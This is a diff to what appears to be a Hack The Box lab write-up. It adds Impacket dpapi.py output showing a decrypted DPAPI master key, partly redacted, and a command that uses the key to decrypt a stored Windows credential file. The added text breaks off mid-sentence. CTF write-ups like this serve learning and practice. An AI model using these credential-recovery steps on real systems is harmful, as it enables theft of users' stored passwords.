@@ -440,6 +440,27 @@ dpapi.py masterkey -file ../../../HTB/Puppy/556a2412-1275-4ccf-b721-e6a0b4f90407
 1. According to the blog the file we downloaded from Protect directory is our masterkey. It is located inside the SID of the user.
 2. Get the SID from the folder and use in -sid tag
 3. Steph2025! is not a real password ffs.
+
+Output
 ```bash
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
+Flags       :        0 (0)
+Policy      : 4ccf1275 (1288639093)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd9a570722fbaf7149f9f{REDACTED}cbfdcaf319e9c84
 
 ```
+Now we will use the Decrypted Key to get the password from Credentials blob
+```bash
+dpapi.py credential -file ../../../HTB/Puppy/C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a5707{REDACTED}e9c84
+```
+We have used the C8--- file as the credential file (From the )
